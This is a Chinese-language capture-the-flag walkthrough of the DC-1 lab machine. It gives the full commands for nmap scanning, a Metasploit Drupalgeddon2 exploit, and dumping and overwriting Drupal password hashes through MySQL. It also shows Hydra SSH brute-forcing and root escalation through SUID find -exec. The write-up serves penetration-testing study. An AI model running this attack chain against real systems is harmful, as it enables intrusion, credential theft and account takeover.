---
tags:
  - nmap
  - Drupal
  - Metasploit
  - CMS
  - config
  - shell
  - sql-shell
  - passwd
  - PrivEsc
  - Linux提权
  - SUID
---
### Flag 1
---
运行靶机，发现登陆界面
![[dc1.0.png]]
运行虚拟机，用 nmap 扫描网段`192.168.1.x`
```bash
nmap -sP 192.168.1.0/24
```
![[dc1.1.png]]
```
Nmap scan report for 192.168.1.119 (192.168.1.119)
Host is up (0.00023s latency).
MAC Address: 08:00:27:BE:D2:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```
发现虚拟机IP：`192.168.1.119`
```bash
nmap -sS 192.168.1.119
nmap -sV -p22,80,111 192.168.1.119
```
![[dc1.2.png]]
探测web指纹
```bash
whatweb http://192.168.1.119
```
![[dc1.3.png]]
```
http://192.168.1.119 [200 OK] Apache[2.2.22], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[192.168.1.119], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.45-0+deb7u14], PasswordField[pass], Script[text/javascript], Title[Welcome to Drupal Site | Drupal Site], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]
```
事实上，访问`http://192.168.1.119`
![[dc1.4.png]]
![[dc1.5.png]]
使用 Wappalyzer 插件分析可知，该靶机使用了 Drupal[^1] 7 作为网站的CMS，查询可知 Drupal 在版本7.x~8.x存在远程执行漏洞。于是启用 metasploit
```bash
msfconsole
```
```Metasploit
search drupal
```
![[dc1.6.png]]
尝试采用`exploit/unix/webapp/drupal_drupalgeddon2`剥削
```Metasploit
use 1
options
set rhosts 192.168.1.119
run
```
![[dc1.7.png]]
成功，查看网络目录结构
```Metasploit
meterpreter > ls
meterpreter > cat flag1.txt
```
得到==**Flag1**==
```
Every good CMS needs a config file - and so do you.
```

### Flag 2
---
提示寻找config配置；创建系统Shell[^3]
```Metasploit
meterpreter > shell
python -c "import pty; pty.spawn('/bin/bash')"
```
```bash
cd sites/default
ls
cat settings.php
```
得到==**Flag2**==
```
/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */
```
![[dc1.8.png]]

### Flag 3
---
`settings.php`中还暴露了数据库`drupaldb`的用户名`dbuser`，密码`R0ck3t`
尝试 `mysql` 连接
```bash
mysql -udbuser -pR0ck3t
```
```mysql
SHOW DATABASES;
USE drupaldb;
SHOW TABLES;
DESC users;
SELECT name,pass FROM users;
```
```
+-------+---------------------------------------------------------+
| name  | pass                                                    |
+-------+---------------------------------------------------------+
|       |                                                         |
| admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR |
| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
+-------+---------------------------------------------------------+
```
`/var/www`文件夹内寻找与hash密码相关的文件
```bash
cd ../..
find . -name *password*
cat ./scripts/password-hash.sh
```
找到`scripts/password-hash.sh`，是用于生成管理员hash密码的PHP脚本
利用该脚本生成简单密码`123`的hash密码，用于覆盖原密码
```bash
php ./scripts/password-hash.sh 123
# password: 123           hash: $S$DF9AbrdTebr0b25D.AIlomKqp0jjVVLoDW5VZa9t5tnMRdQ/hSU2
```
`mysql` 进入数据库后覆盖管理员密码
```bash
mysql -udbuser -pR0ck3t
```
```mysql
USE drupaldb;
UPDATE users SET pass="$S$DF9AbrdTebr0b25D.AIlomKqp0jjVVLoDW5VZa9t5tnMRdQ/hSU2" WHERE name="admin";
```
这样就获得了网站的权限
![[dc1.9.png]]
找到==**Flag3**==
```
Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
```

### Flag 4
---
根据提示，查看`/etc/passwd`
```bash
cat /etc/passwd
# flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```
`flag4`为普通用户，直接读取
```bash
cd /home/flag4
cat flag4.txt
```
得到==**Flag4**==
```
Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```

### Flag 5
---
首先寻求登入`flag4`用户，尝试通过开放的 22 端口（`ssh`）爆破弱口令
```bash
hydra -l flag4 -P /usr/share/john/password.lst 192.168.1.119 ssh
# [22][ssh] host: 192.168.1.119   login: flag4   password: orange
```
得到密码`orange`，`ssh`连接
```bash
ssh flag4@192.168.1.119
```
![[dc1.10.png]]
`cd /root`发现权限不足
**开始提权部分：**
首先考虑使用 SUID[^2] 提权找到一个属于 root 的有 s 权限的文件
```
# 常见的可用于 SUID 提权的文件有：
find、bash、nmap、vim、more、less、nano、cp 
# 当没有 s 权限时可以使用 chmod u+s 命令路径，增加权限
```
```bash
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```
![[dc1.11.png]]
**发现 `find` 命令是突破口，于是以此提权**
```bash
find . -exec "/bin/bash" \;
# bash-4.2$
find . -exec "/bin/sh" \;
whoami
# root
```
提权成功！进 `/root` 看看
```bash
cd /root
ls
cat thefinalflag.txt
```
```
Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```
拿到最终的==**Flag5**==，收工。

## END
---
[^1]: Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由内容管理系统（CMS）和PHP开发框架（Framework）共同构成，在GPL2.0及更新协议下发布

[^2]: SUID (Set User ID)，SUID 可以让调用者以文件拥有者的身份运行该文件，所以我们利用 SUID 提权的思路就是运行 root 用户所拥有的 SUID 的文件，那么我们运行该文件的时候就得获得 root 用户的身份了

[^3]: 代码中的`cat settings.php`可修正为`head -n 30 settings.php`

